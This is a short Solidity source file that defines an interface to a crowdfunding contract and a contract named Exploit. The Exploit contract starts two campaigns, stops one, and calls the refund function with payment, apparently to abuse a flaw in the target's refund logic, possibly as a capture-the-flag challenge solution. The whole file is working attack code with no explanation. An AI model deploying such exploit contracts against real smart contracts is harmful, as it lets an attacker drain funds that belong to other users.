pragma solidity 0.8.11;

interface ICrowdFunding {
    function startCampaign() payable external;
    function getRefund(uint campaignID, uint funderID) external payable;
    function stopCampaign(uint campaignID) external payable;
    function printCampaign(uint campaignID) external;
    function getStorageAt(uint index) external view returns(bytes32);
}


contract Exploit {
    ICrowdFunding crowd_funding;

    constructor(ICrowdFunding _crowd_funding) payable {
        crowd_funding = _crowd_funding;
        crowd_funding.startCampaign{value: 1}();
        crowd_funding.startCampaign{value: 1}();
        crowd_funding.stopCampaign(0);
    }


    function attack() public payable {
        crowd_funding.getRefund{value: 1}(0, 0);
    }

    receive() external payable {}
    fallback() external payable {}
}
